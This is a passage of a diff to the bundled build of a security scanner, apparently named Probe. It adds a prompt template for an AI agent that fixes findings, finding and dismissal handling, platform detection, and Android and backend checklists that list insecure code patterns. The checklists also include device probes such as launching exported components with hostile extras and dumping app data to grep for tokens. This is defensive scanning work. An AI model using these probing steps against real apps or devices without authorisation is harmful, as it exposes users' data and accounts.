+    `Fix one security problem that Probe found in the project in the current directory${f.feature !== "project" ? ` (feature "${f.feature}")` : ""}.`,
+    `## The problem
+${f.title}
+- Check: ${f.check} (${f.severity})${f.refs.length ? ` \xB7 ${f.refs.join(", ")}` : ""}
+- Where: ${f.file ? `${f.file}${f.line ? `:${f.line}` : ""}` : "the app as a whole"}
+- Found by: ${LAYER_SEEN[f.layer]}
+- Evidence: ${f.evidence}`,
+    `## Why it matters
+${f.why}`,
+    `## The expected fix
+${f.fix}`
+  ];
+  const seen = [`- Run ${run.id} (security), ${run.finishedAt ?? run.startedAt}`];
+  if (run.git) seen.push(`- Code: ${run.git.branch ?? "detached HEAD"} @ ${run.git.commit}${run.git.dirty ? ` + ${run.git.dirty} uncommitted file(s)` : ""}`);
+  parts.push(`## Where it was seen
+${seen.join("\n")}`);
+  if (modules) parts.push(`## The feature's code (modules)
+${modules}`);
+  const special = [];
+  if (f.layer === "history" || f.check === "COM-SEC-05") special.push("The secret is in git history: changing the code does not remove it. Rotating it (a new key at the provider, the old one revoked) is the fix; say so, and list the history purge (git filter-repo) as a step for a person. Never rewrite history or push yourself.");
+  if (/secret|key|token|password|credential/i.test(f.title) && f.layer !== "deps") special.push("Treat the secret as leaked: the code change must stop shipping it (load it from the environment / a secret store, or move the call to the server), and the summary must say that the old value has to be rotated by a person.");
+  if (f.layer === "deps") special.push("Upgrade to the lowest version that fixes it, update the lockfile the same way the project does (say which command a person must run if you cannot run it), and note a major-version bump and anything it may break.");
+  if (f.layer === "agent") special.push("This finding comes from an agent's reading and may be wrong. First confirm the attack path in the code; if it does not hold (a check exists elsewhere), change nothing and explain why.");
+  if (f.layer === "artifact") special.push("The problem is in the built app; fix the source or build config that put it there. Probe re-checks after the next build.");
+  if (special.length) parts.push(`## Notes for this kind of problem
+${special.map((s) => `- ${s}`).join("\n")}`);
+  const check2 = forProbe ? `5. Probe runs the same check (${f.check}) on the changed code afterwards, and the feature's unit tests when it has any. Call probe_unit_run with feature "${f.feature}" if it has tests, and fix what breaks.` : `5. Run the feature's unit tests if it has any (\`/probe unit ${f.feature}\` with Probe), then re-run the check: \`probe security${f.feature !== "project" ? ` ${f.feature}` : ""}\`.`;
+  parts.push(`## How
+1. Read the project's shared agent notes (AGENTS.md), any provider-specific notes, and docs for this feature; follow them.
+2. Confirm the problem in the code and find where the unsafe value or setting comes from. Make the smallest change that closes the attack path. Do not touch unrelated code.
+3. Never hide the finding instead of fixing it: no probe-security-ignore comments, no lint or scanner suppressions, no renaming to dodge the pattern, no weakening other checks.
+4. Where the fix can be unit-tested (a sanitiser, an authorization check, a parser), add a test that fails without the fix.
+${check2}
+6. If it is not a real problem here (test-only code, a value that is not secret, a protection elsewhere), change nothing and say exactly why, so a person can dismiss it.
+7. Finish with: the root cause, the files you changed, what a person still has to do (rotate a key, run a lockfile update, rebuild), and how you checked it.
+
+Never commit, stage, push or switch branches.`);
+  return parts.join("\n\n");
+}
 
 // src/engine/unit.ts
 function startUnitRun(project, featureId) {
@@ -22814,7 +22883,7 @@ function startUnitRun(project, featureId) {
       run.error = feature.stats.testFiles > 0 ? "This feature has tests but no command to run them: set unit.command in probe/probe.yaml." : "This feature has no unit tests.";
       return;
     }
-    const fingerprint = unitFingerprint(project, latestScan(project), feature.id);
+    const fingerprint2 = unitFingerprint(project, latestScan(project), feature.id);
     const since = Date.now();
     const inv = await project.adapter.runUnitTests(project.root, modules, log, project.config);
     run.command = inv.command;
@@ -22826,7 +22895,7 @@ function startUnitRun(project, featureId) {
       run.status = "error";
       run.error = "The build succeeded but wrote no test reports.";
     }
-    recordUnitResult(project, run, fingerprint);
+    recordUnitResult(project, run, fingerprint2);
   });
 }
 function summarizeRun(run) {
@@ -22841,11 +22910,1622 @@ function summarizeRun(run) {
   return lines.join("\n");
 }
 
+// src/security/run.ts
+var import_node_fs28 = require("node:fs");
+var import_node_path38 = require("node:path");
+
+// src/security/agent.ts
+var import_node_path34 = require("node:path");
+
+// src/security/findings.ts
+var import_node_crypto4 = require("node:crypto");
+var import_node_path32 = require("node:path");
+var SEVERITY_ORDER = ["critical", "high", "medium", "low", "info"];
+var severityRank = (s) => SEVERITY_ORDER.indexOf(s);
+var IGNORED = /(^|\/)(node_modules|bower_components|vendor|Pods|Carthage|\.git|\.gradle|\.idea|\.vscode|build|dist|out|target|\.next|\.nuxt|\.svelte-kit|\.output|coverage|\.turbo|\.cache|DerivedData|\.dart_tool|__pycache__|\.venv|venv|\.tox|bin|obj)\//;
+var MINIFIED = /\.min\.(js|css)$|[-.]bundle\.js$|\.map$/;
+function securityFiles(project) {
+  const extra = project.config.security?.ignorePaths ?? [];
+  const extraRe = extra.length ? new RegExp(extra.map(globToRegex).join("|")) : null;
+  return listProjectFiles(project.root, IGNORED).filter((f) => !MINIFIED.test(f) && !(extraRe && extraRe.test(f)));
+}
+function globToRegex(glob) {
+  return `^${glob.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*\*\/?/g, "\0").replace(/\*/g, "[^/]*").replace(/\?/g, "[^/]").replace(/\u0000/g, ".*")}`;
+}
+function featureOwner(project, scan2) {
+  const dirs = (scan2?.features ?? []).flatMap((f) => f.modules.map((m) => ({ feature: f.id, dir: (0, import_node_path32.relative)(project.root, (0, import_node_path32.resolve)(project.root, m.dir)).replace(/\\/g, "/") }))).filter((d) => d.dir && !d.dir.startsWith("..")).sort((a, b) => b.dir.length - a.dir.length);
+  return (file) => dirs.find((d) => file === d.dir || file.startsWith(`${d.dir}/`))?.feature ?? "project";
+}
+function mask(text2) {
+  return text2.replace(/[A-Za-z0-9+/_\-=]{8,}/g, (s) => `${s.slice(0, 4)}${"\u2022".repeat(Math.min(12, s.length - 6))}${s.slice(-2)}`);
+}
+function fingerprint(check2, file, evidence) {
+  const norm = evidence.replace(/\s+/g, " ").trim().toLowerCase();
+  return (0, import_node_crypto4.createHash)("sha1").update(`${check2}\0${file ?? ""}\0${norm}`).digest("hex").slice(0, 16);
+}
+function makeFinding(f) {
+  return { ...f, evidence: f.evidence.slice(0, 400), fingerprint: fingerprint(f.check, f.file, f.evidence) };
+}
+var DISMISSED = "security-dismissed.json";
+function loadDismissals(project) {
+  return project.store.read(DISMISSED) ?? [];
+}
+function dismiss(project, finding2, reason) {
+  if (!reason.trim()) throw new Error("Say why it is not an issue: the reason is what keeps a dismissal honest.");
+  const list = loadDismissals(project).filter((d) => d.fingerprint !== finding2.fingerprint);
+  const entry = { fingerprint: finding2.fingerprint, check: finding2.check, file: finding2.file, reason: reason.trim(), at: (/* @__PURE__ */ new Date()).toISOString() };
+  project.store.write(DISMISSED, [...list, entry]);
+  return entry;
+}
+function undismiss(project, fingerprintId) {
+  const list = loadDismissals(project);
+  const next = list.filter((d) => d.fingerprint !== fingerprintId);
+  project.store.write(DISMISSED, next);
+  return next.length !== list.length;
+}
+function sortFindings(list) {
+  return [...list].sort((a, b) => severityRank(a.severity) - severityRank(b.severity) || (a.file ?? "").localeCompare(b.file ?? "") || (a.line ?? 0) - (b.line ?? 0));
+}
+function dedupe(list) {
+  const seen = /* @__PURE__ */ new Map();
+  for (const f of list) {
+    const prev = seen.get(f.fingerprint);
+    if (!prev || severityRank(f.severity) < severityRank(prev.severity)) seen.set(f.fingerprint, f);
+  }
+  return [...seen.values()];
+}
+
+// src/security/platforms.ts
+var import_node_fs25 = require("node:fs");
+var import_node_path33 = require("node:path");
+function detectPlatforms(root, files) {
+  const found3 = /* @__PURE__ */ new Set();
+  const has = (re) => files.some((f) => re.test(f));
+  const deps = packageDeps(root, files);
+  const dep = (re) => [...deps].some((d) => re.test(d));
+  if (has(/AndroidManifest\.xml$/)) found3.add("android");
+  if (has(/\.xcodeproj\/|\.xcworkspace\/|(^|\/)Info\.plist$|\.swift$|(^|\/)Podfile$/)) found3.add("ios");
+  if (has(/(^|\/)pubspec\.yaml$/) && has(/\.dart$/)) found3.add("flutter");
+  if (dep(/^(react-native|expo)$/)) found3.add("rn");
+  if (has(/\/(commonMain|iosMain|androidMain)\//)) found3.add("kmp");
+  if (dep(/^@capacitor\/|^cordova/) || has(/(^|\/)config\.xml$/) && has(/(^|\/)www\/index\.html$/)) found3.add("hybrid");
+  if (has(/\.csproj$/) && files.some((f) => /\.csproj$/.test(f) && /Maui|Xamarin/.test(read(root, f)))) found3.add("maui");
+  if (dep(/^electron$/)) found3.add("electron");
+  if (dep(/^@tauri-apps\//) || has(/(^|\/)tauri\.conf\.json$/)) found3.add("tauri");
+  if (dep(/^(react|react-dom|vue|@angular\/core|svelte|solid-js|preact|next|nuxt|vite|webpack|@sveltejs\/kit|astro|jquery)$/) || has(/(^|\/)(public|static|www)\/.+\.html$|(^|\/)index\.html$/) || has(/(^|\/)manifest\.json$/) && files.some((f) => /(^|\/)manifest\.json$/.test(f) && /"manifest_version"/.test(read(root, f)))) found3.add("web");
+  if (dep(/^(express|fastify|koa|@nestjs\/core|@hapi\/hapi|hono|next|@remix-run\/node|nuxt|@sveltejs\/kit|restify|apollo-server|@apollo\/server|graphql-yoga)$/)) found3.add("node");
+  if (has(/(^|\/)(requirements[^/]*\.txt|pyproject\.toml|Pipfile|setup\.py)$/) || has(/\.py$/)) found3.add("python");
+  if (has(/\.(java|kt)$/) && (has(/(^|\/)(pom\.xml)$/) || files.some((f) => /\.gradle(\.kts)?$/.test(f) && /spring|ktor|micronaut|quarkus|javax\.servlet|jakarta/.test(read(root, f))))) found3.add("jvm");
+  if (has(/(^|\/)go\.mod$/)) found3.add("go");
+  if (has(/\.csproj$/) && !found3.has("maui")) found3.add("dotnet");
+  if (has(/(^|\/)composer\.json$/) || has(/\.php$/)) found3.add("php");
+  if (has(/(^|\/)Gemfile$/) || has(/\.rb$/)) found3.add("ruby");
+  if (["node", "python", "jvm", "go", "dotnet", "php", "ruby"].some((p) => found3.has(p))) found3.add("backend");
+  if (has(/(^|\/)Dockerfile[^/]*$|(^|\/)(docker-)?compose[^/]*\.ya?ml$/)) found3.add("docker");
+  if (has(/^\.github\/workflows\/|(^|\/)\.gitlab-ci\.ya?ml$|^\.gitlab\/ci\/|(^|\/)Jenkinsfile$|^\.circleci\/|(^|\/)bitbucket-pipelines\.yml$|(^|\/)azure-pipelines\.ya?ml$/)) found3.add("ci");
+  if (has(/\.tf$|(^|\/)(k8s|kubernetes|helm|charts|manifests)\/|(^|\/)serverless\.ya?ml$|(^|\/)template\.ya?ml$/)) found3.add("iac");
+  return found3;
+}
+function packageDeps(root, files) {
+  const out = /* @__PURE__ */ new Set();
+  for (const f of files.filter((x) => /(^|\/)package\.json$/.test(x) && !x.includes("node_modules/"))) {
+    try {
+      const pkg = JSON.parse(read(root, f));
+      for (const key of ["dependencies", "devDependencies", "peerDependencies"]) for (const name of Object.keys(pkg[key] ?? {})) out.add(name);
+    } catch {
+    }
+  }
+  return out;
+}
+function read(root, file) {
+  const path = (0, import_node_path33.join)(root, file);
+  try {
+    return (0, import_node_fs25.existsSync)(path) ? (0, import_node_fs25.readFileSync)(path, "utf8") : "";
+  } catch {
+    return "";
+  }
+}
+var PLATFORM_DOCS = {
+  common: "common.md",
+  android: "android.md",
+  ios: "ios.md",
+  web: "web-frontend.md",
+  backend: "backend.md",
+  node: "backend.md",
+  python: "backend.md",
+  jvm: "backend.md",
+  go: "backend.md",
+  dotnet: "backend.md",
+  php: "backend.md",
+  ruby: "backend.md",
+  rn: "cross-platform-mobile.md",
+  flutter: "cross-platform-mobile.md",
+  kmp: "cross-platform-mobile.md",
+  hybrid: "cross-platform-mobile.md",
+  maui: "cross-platform-mobile.md",
+  electron: "desktop.md",
+  tauri: "desktop.md",
+  docker: "common.md",
+  ci: "common.md",
+  iac: "common.md"
+};
+
+// docs/security/android.md
+var android_default = '# Android security checks\n\nApplies to: Android apps (Gradle, Kotlin/Java, native NDK code). Built from a real Android audit plus the gaps that audit listed for follow-up.\nStandards: OWASP MASVS v2 / MASTG, CWE. Shared checks (secrets, dependencies, CI) are in [common.md](common.md).\n\nHow each check runs: **S** static (source/config), **D** dependencies, **B** built APK/AAB, **R** runtime on a device or emulator, **A** agent review. **Sev** is the default; the real severity depends on the attack path found.\n\n## 1. Manifest & app config\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-MAN-01 | App is debuggable in release | `android:debuggable="true"`, `isDebuggable = true` on a release build type | S, B | High | CWE-215, MASVS-RESILIENCE |\n| AND-MAN-02 | Backup exposes app data | `allowBackup="true"` without rules; `fullBackupContent` / `dataExtractionRules` that include tokens, DBs, prefs | S | Medium | CWE-530, MASVS-STORAGE |\n| AND-MAN-03 | Backup/transfer rules include secrets (Android 12+) | `data_extraction_rules.xml` cloud-backup and device-transfer sections not excluding token store / credential files | S | Medium | MASVS-STORAGE |\n| AND-MAN-04 | Cleartext traffic allowed app-wide | `usesCleartextTraffic="true"`, `cleartextTrafficPermitted="true"` in base-config | S, B | High | CWE-319, MASVS-NETWORK |\n| AND-MAN-05 | No network security config | missing `networkSecurityConfig` attribute / `network_security_config.xml` | S, B | Medium | MASVS-NETWORK |\n| AND-MAN-06 | User-installed CAs trusted in release | `<certificates src="user"/>` outside `debug-overrides` | S | High | CWE-295 |\n| AND-MAN-07 | Old minSdk / targetSdk | `minSdk` < 23 (no runtime perms, weak TLS), `targetSdk` behind Play\'s current requirement | S | Low | MASVS-CODE |\n| AND-MAN-08 | Dangerous or unused permissions | `READ_SMS`, `READ_CALL_LOG`, `QUERY_ALL_PACKAGES`, `MANAGE_EXTERNAL_STORAGE`, `SYSTEM_ALERT_WINDOW`, `REQUEST_INSTALL_PACKAGES` with no feature using them | S, A | Medium | MASVS-PRIVACY |\n| AND-MAN-09 | Custom permission protection too weak | `<permission>` with `protectionLevel="normal"` guarding sensitive components; typo\'d permission names | S | Medium | CWE-276 |\n| AND-MAN-10 | `taskAffinity` / `launchMode` enables task hijacking (StrandHogg) | non-default `taskAffinity`, `singleTask` on sensitive activities, `allowTaskReparenting` | S | Medium | CWE-1021 |\n| AND-MAN-11 | Tooling/debug components shipped | `PreviewActivity`, Chucker, LeakCanary, Flipper, Stetho, debug drawers present in the release manifest | B | Low | MASVS-CODE |\n| AND-MAN-12 | `sharedUserId` used | `android:sharedUserId` (deprecated, widens trust between apps) | S | Low | CWE-266 |\n\n## 2. Exported components & IPC\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-IPC-01 | Exported activity without a permission | `exported="true"` (or implicit via intent-filter on targetSdk < 31) and no `android:permission` | S, B | Medium\u2013High | CWE-926 |\n| AND-IPC-02 | Exported service without a permission | same for `<service>`, especially bound services with AIDL | S, B | High | CWE-926 |\n| AND-IPC-03 | Exported broadcast receiver without a permission | `<receiver exported="true">`; `registerReceiver` without `RECEIVER_NOT_EXPORTED` (Android 14+) | S | Medium | CWE-925 |\n| AND-IPC-04 | Exported content provider | `<provider exported="true">` with no read/write permission; `grantUriPermissions="true"` on a wide path | S, B | High | CWE-200 |\n| AND-IPC-05 | Content provider SQL injection | `query()` building SQL from `selection`/`sortOrder` without `SQLiteQueryBuilder.setStrict` / projection map | S, A | High | CWE-89 |\n| AND-IPC-06 | Content provider path traversal | `openFile()` using `uri.lastPathSegment` / `getPath()` without canonicalising | S | High | CWE-22 |\n| AND-IPC-07 | Intent redirection | exported component reads an `Intent` from extras (`getParcelableExtra("intent")`) and calls `startActivity` with it | S, A | High | CWE-940 |\n| AND-IPC-08 | Implicit intent carrying sensitive data | `sendBroadcast`/`startActivity` with an implicit intent and tokens/PII in extras | S | Medium | CWE-927 |\n| AND-IPC-09 | Mutable or implicit PendingIntent | `FLAG_MUTABLE` without need; PendingIntent wrapping an implicit intent; `FLAG_UPDATE_CURRENT` with untrusted extras | S | Medium | CWE-927 |\n| AND-IPC-10 | Untrusted extras trusted | navigation route, URL or user id taken from extras (push, notification, share) without validation | S, A | Medium | CWE-20 |\n| AND-IPC-11 | Share/`SEND` handler trusts incoming URIs | accepts `file://`, accepts `content://` pointing at the app\'s own provider, no MIME/size checks | S, A | Medium | CWE-73 |\n| AND-IPC-12 | Unsafe Parcelable / Serializable | `readSerializable`, `getSerializableExtra` on exported paths; Parcel mismatch bugs | S | Medium | CWE-502 |\n| AND-IPC-13 | Exported component reachable on device | actually launch every exported component with `adb shell am start/startservice/broadcast` and empty / hostile extras | R | \u2014 | MASTG-TEST-0029 |\n\n## 3. Deep links & App Links\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-LNK-01 | `http(s)` link filter without `autoVerify` | VIEW + BROWSABLE `https` filter missing `autoVerify="true"`; duplicate unverified filters next to verified ones | S, B | High | CWE-939 |\n| AND-LNK-02 | `assetlinks.json` missing or wrong | `/.well-known/assetlinks.json` absent, wrong package or SHA-256 cert | R | Medium | MASVS-PLATFORM |\n| AND-LNK-03 | Custom scheme used for sensitive flows | OAuth redirect, password reset, magic link on `myapp://` (hijackable by any app) | S | High | CWE-939 |\n| AND-LNK-04 | Deep link parameters not validated | host/path/query used to open URLs, WebViews, files or screens without allowlist | S, A | High | CWE-20 |\n| AND-LNK-05 | Deep link skips auth | link opens a screen that should require login or re-auth | R, A | High | CWE-306 |\n| AND-LNK-06 | Overly broad path pattern | `pathPattern="/.*"` capturing paths the app doesn\'t handle | S | Low | \u2014 |\n\n## 4. WebView\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-WEB-01 | JS bridge exposed to any origin | `addJavascriptInterface` while loading URLs not on an allowlist | S, A | High | CWE-749 |\n| AND-WEB-02 | No URL allowlist | `loadUrl` with URLs from deep links, push, server, intents; `shouldOverrideUrlLoading` returning false for everything | S, A | High | CWE-939 |\n| AND-WEB-03 | `intent://` handling | `Intent.parseUri` from page URLs, launching components or honouring `browser_fallback_url` without filtering | S | High | CWE-470 |\n| AND-WEB-04 | File access enabled | `setAllowFileAccess(true)`, `allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs` | S | High | CWE-200 |\n| AND-WEB-05 | Content access enabled | `setAllowContentAccess(true)` with a loaded remote page | S | Medium | \u2014 |\n| AND-WEB-06 | Mixed content allowed | `MIXED_CONTENT_ALWAYS_ALLOW` | S | Medium | CWE-319 |\n| AND-WEB-07 | SSL errors ignored | `onReceivedSslError { handler.proceed() }` | S | Critical | CWE-295 |\n| AND-WEB-08 | JS string building | `evaluateJavascript` / `loadUrl("javascript:\u2026")` concatenating untrusted data | S | High | CWE-79 |\n| AND-WEB-09 | Debugging on in release | `WebView.setWebContentsDebuggingEnabled(true)` not gated on debug | S | Medium | CWE-489 |\n| AND-WEB-10 | Cookies / tokens shared with untrusted pages | `CookieManager` third-party cookies on, auth headers added to all URLs | S, A | Medium | CWE-201 |\n| AND-WEB-11 | Safe Browsing disabled | `<meta-data android:name="android.webkit.WebView.EnableSafeBrowsing" android:value="false">` | S | Low | \u2014 |\n\n## 5. Data storage\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-STO-01 | Tokens stored in plaintext | access/refresh tokens, session ids in SharedPreferences / DataStore without encryption | S, R | Critical | CWE-312, CWE-922 |\n| AND-STO-02 | Credentials stored at all | passwords (even "encrypted") persisted on device | S | Critical | CWE-256 |\n| AND-STO-03 | Database unencrypted with PII | Room/SQLite holding messages, PII, tokens without SQLCipher | S, R | High | CWE-312 |\n| AND-STO-04 | External/shared storage for private data | `getExternalStorageDirectory`, `MediaStore` writes of private files, `Environment.DIRECTORY_DOWNLOADS` | S | High | CWE-922 |\n| AND-STO-05 | World-readable/writable modes | `MODE_WORLD_READABLE`, `MODE_WORLD_WRITEABLE`, `chmod 777`, `setReadable(true, false)` | S | High | CWE-276 |\n| AND-STO-06 | Sensitive data in cache / temp | files with tokens or PII in `cacheDir` / `createTempFile` not cleaned | S, R | Low | CWE-459 |\n| AND-STO-07 | FileProvider paths too broad | `<root-path>`, `path="."` on cache/files/external | S | Medium | CWE-200 |\n| AND-STO-08 | Keyboard cache / autofill on secrets | password/OTP fields without `inputType=textPassword` / `importantForAutofill` rules; `textNoSuggestions` missing | S | Low | MASVS-STORAGE |\n| AND-STO-09 | Clipboard exposure | tokens, OTPs, passwords copied without `EXTRA_IS_SENSITIVE` (Android 13+) or auto-clear | S | Low | CWE-200 |\n| AND-STO-10 | What\'s actually on disk | dump `/data/data/<pkg>` on a debug/rooted emulator after login; grep for tokens, emails, passwords | R | \u2014 | MASTG-TEST-0001 |\n\n## 6. Cryptography\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-CRY-01 | Hard-coded key | AES/HMAC/EC keys in source, `BuildConfig`, resources, native strings | S, B | Critical | CWE-321 |\n| AND-CRY-02 | Static or zero IV | `IvParameterSpec(ByteArray(16))`, constant IV, IV derived from key | S | Critical | CWE-329 |\n| AND-CRY-03 | Weak mode | `AES/ECB`, `"AES"` with no mode (defaults to ECB), CBC without MAC | S | High | CWE-327 |\n| AND-CRY-04 | Weak algorithm | DES, 3DES, RC4, MD5/SHA-1 for integrity or passwords | S | High | CWE-327, CWE-328 |\n| AND-CRY-05 | Insecure random | `java.util.Random`, `Math.random`, seeded `SecureRandom` for tokens/keys/IVs | S | High | CWE-338 |\n| AND-CRY-06 | Keys not in Android Keystore | key material generated/stored in app files instead of `AndroidKeyStore` | S, A | High | MASVS-CRYPTO |\n| AND-CRY-07 | Weak key derivation | password \u2192 key with plain hash, low PBKDF2 iterations, no salt | S | High | CWE-916 |\n| AND-CRY-08 | Outdated crypto library | SpongyCastle, old Bouncy Castle, Conscrypt pins | D | Medium | CWE-1104 |\n| AND-CRY-09 | Home-made crypto / signing | custom XOR "encryption", client-side HMAC signing as a security control | S, A | High | CWE-327 |\n| AND-CRY-10 | Biometric not bound to crypto | `BiometricPrompt` without a `CryptoObject` (bypassable with hooking) | S | Medium | MASVS-AUTH |\n\n## 7. Network & TLS\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-NET-01 | Trust-all TrustManager | custom `X509TrustManager` with empty `checkServerTrusted` | S | Critical | CWE-295 |\n| AND-NET-02 | Hostname verification off | `HostnameVerifier { _, _ -> true }`, `ALLOW_ALL_HOSTNAME_VERIFIER` | S | Critical | CWE-297 |\n| AND-NET-03 | No certificate pinning on sensitive APIs | no `CertificatePinner` / `<pin-set>` for auth and payment hosts | S | Medium | MASVS-NETWORK |\n| AND-NET-04 | Pinning without backup pin / expiry | single pin, no `expiration` \u2014 bricks app on rotation | S | Medium | \u2014 |\n| AND-NET-05 | `http://` URLs in code/config | base URLs, endpoints, image hosts | S, B | Medium | CWE-319 |\n| AND-NET-06 | Secrets in query strings | `api_key`, `client_secret`, tokens appended to URLs | S | Medium | CWE-598 |\n| AND-NET-07 | HTTP logging in release | OkHttp `HttpLoggingInterceptor.Level.BODY` / Chucker not gated on debug | S | High | CWE-532 |\n| AND-NET-08 | No retry/backoff | 429/503 retry storms | S | Low | \u2014 |\n| AND-NET-09 | MITM test | run the app through a proxy with a user CA installed; see which hosts accept it | R | \u2014 | MASTG-TEST-0021 |\n\n## 8. Authentication & session\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-AUT-01 | Client-side auth decisions | `isPremium`, `isAdmin`, PIN check done locally and trusted to unlock server data | S, A | High | CWE-602 |\n| AND-AUT-02 | Tokens never expire / refresh unprotected | no expiry handling, refresh token reused indefinitely | A | Medium | CWE-613 |\n| AND-AUT-03 | Logout doesn\'t clear state | tokens, DB, caches, WebView cookies left after logout | R, A | Medium | CWE-613 |\n| AND-AUT-04 | OAuth without PKCE / via WebView | custom-tab-less OAuth in WebView, no `code_verifier` | S | High | RFC 8252 |\n| AND-AUT-05 | Request signing with a shipped key | HMAC/nonce computed with a key in the APK (forgeable) | S | Critical | CWE-345 |\n| AND-AUT-06 | Replay possible | signed requests without nonce/timestamp | A | Medium | CWE-294 |\n| AND-AUT-07 | Local PIN / biometric bypass | lock screen state stored in prefs, bypass via exported activity | R, A | High | CWE-287 |\n\n## 9. Privacy & UI\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-PRV-01 | No `FLAG_SECURE` on sensitive screens | login, OTP, payment, private content screens | S, R | Low | MASVS-PLATFORM |\n| AND-PRV-02 | Tapjacking / overlay | sensitive buttons without `filterTouchesWhenObscured` / `setHideOverlayWindows` | S | Low | CWE-1021 |\n| AND-PRV-03 | Sensitive data in notifications | OTPs, messages visible on lock screen (`VISIBILITY_PUBLIC`) | S | Low | CWE-200 |\n| AND-PRV-04 | Device identifiers | IMEI, MAC, `ANDROID_ID` sent to third parties | S, A | Low | MASVS-PRIVACY |\n| AND-PRV-05 | Third-party SDK data collection | analytics/ads SDKs receiving PII; Data Safety form mismatch | A | Medium | MASVS-PRIVACY |\n| AND-PRV-06 | Recents thumbnail leaks | sensitive screen visible in the app switcher | R | Low | \u2014 |\n\n## 10. Logging\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-LOG-01 | Secrets in logs | `Log.*`, Timber, custom loggers printing tokens, passwords, OTPs, (even their lengths) | S | Medium | CWE-532 |\n| AND-LOG-02 | Logs forwarded to crash/analytics | Crashlytics/Sentry breadcrumbs carrying PII or tokens | S, A | Medium | CWE-532 |\n| AND-LOG-03 | Verbose logs not stripped in release | no R8 `-assumenosideeffects` for `Log.d/v`; logger not gated | S, B | Low | \u2014 |\n| AND-LOG-04 | What logcat shows | run a login + main flows, grep logcat for tokens, emails, passwords | R | \u2014 | MASTG-TEST-0003 |\n\n## 11. Build, code & resilience\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-BLD-01 | Release not minified/obfuscated | `isMinifyEnabled=false`, `-dontobfuscate`, obfuscation only on CI | S, B | Low | MASVS-RESILIENCE |\n| AND-BLD-02 | Secrets in `BuildConfig` / resources | `buildConfigField` or `resValue` with keys; secrets-gradle-plugin keys not `ignore.`-prefixed | S, B | Medium\u2013Critical | CWE-798 |\n| AND-BLD-03 | Secrets in the shipped binary | grep dex string pools, `resources.arsc`, `assets/`, `.so` files of the built APK | B | Critical | CWE-798 |\n| AND-BLD-04 | Signing keystore in repo | `*.jks`, `*.keystore` tracked by git | S | Critical | CWE-522 |\n| AND-BLD-05 | Signing passwords in build files | `storePassword` literal in `build.gradle(.kts)` / `gradle.properties` | S | High | CWE-798 |\n| AND-BLD-06 | Native debug symbols shipped | unstripped `.so`, `debugSymbolLevel FULL` in the bundle served to users | B | Info | \u2014 |\n| AND-BLD-07 | Debug builds distributed | debuggable builds sent to testers via Firebase / App Center | S | Low | CWE-215 |\n| AND-BLD-08 | No integrity / attestation | no Play Integrity on sensitive endpoints; no signature check | A | Info | MASVS-RESILIENCE |\n| AND-BLD-09 | No root / hook detection where required | banking/payment apps without RASP | A | Info | MASVS-RESILIENCE |\n| AND-BLD-10 | Dynamic code loading | `DexClassLoader`, `PathClassLoader` from downloaded files, `Runtime.exec` | S | High | CWE-494 |\n| AND-BLD-11 | Native code memory safety | `strcpy`, `sprintf`, `gets` in JNI/NDK sources | S | Medium | CWE-120 |\n| AND-BLD-12 | `google-services.json` committed with unrestricted keys | Firebase config tracked + API key without app restriction | S | Low | \u2014 |\n\n## 12. Injection on device\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| AND-INJ-01 | SQL built from strings | `rawQuery`/`execSQL` with concatenation, Room `@RawQuery`, `SimpleSQLiteQuery` from input | S | High | CWE-89 |\n| AND-INJ-02 | Command execution | `Runtime.exec`, `ProcessBuilder` with input | S | High | CWE-78 |\n| AND-INJ-03 | Zip slip | `ZipInputStream` entries written without checking `..` | S | High | CWE-22 |\n| AND-INJ-04 | Unsafe XML parsing | `DocumentBuilderFactory` / `XmlPullParser` without disabling external entities | S | Medium | CWE-611 |\n| AND-INJ-05 | Unsafe deserialization | `ObjectInputStream`, Gson/Jackson polymorphic typing on untrusted data | S | High | CWE-502 |\n| AND-INJ-06 | Fragment injection | `PreferenceActivity` without `isValidFragment` | S | Medium | CWE-470 |\n';
+
+// docs/security/backend.md
+var backend_default = '# Backend & API security checks\n\nApplies to: HTTP/GraphQL/gRPC servers, workers and serverless functions \u2014 Node (Express, Nest, Fastify, Next.js API/server actions), Python (Django, Flask, FastAPI), JVM (Spring, Ktor), Go, .NET, PHP (Laravel, Symfony), Ruby (Rails).\nStandards: OWASP Top 10 2021, OWASP API Security Top 10 2023, OWASP ASVS 4, CWE. Shared checks in [common.md](common.md).\n\nHow: **S** static, **D** dependencies, **R** runtime against the local server (localhost only), **A** agent review.\n\nSections 1\u201310 apply to every backend. Section 11 lists the patterns each language/framework needs for the static rules.\n\n## 1. Authentication\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| API-AUN-01 | Route without auth | handlers missing auth middleware/decorator/attribute that touch user data | S, A, R | Critical | API2, CWE-306 |\n| API-AUN-02 | Weak password hashing | MD5/SHA-1/SHA-256 for passwords, no salt, bcrypt cost < 10 | S | High | CWE-916 |\n| API-AUN-03 | JWT verification flaws | `alg: none` accepted, `decode` instead of `verify`, HS/RS confusion, no `exp`/`aud`/`iss` check | S | Critical | CWE-347 |\n| API-AUN-04 | Hard-coded / weak JWT or session secret | `secret`, `changeme`, secret in source | S | Critical | CWE-798 |\n| API-AUN-05 | No brute-force protection | login, OTP, password reset, 2FA without rate limit / lockout | S, R | High | API4, CWE-307 |\n| API-AUN-06 | Password reset flaws | guessable or long-lived tokens, token not single-use, host-header-based reset links, user enumeration | S, A, R | High | CWE-640 |\n| API-AUN-07 | User enumeration | different responses/timing for unknown vs. known accounts | R | Low | CWE-204 |\n| API-AUN-08 | Session not rotated / 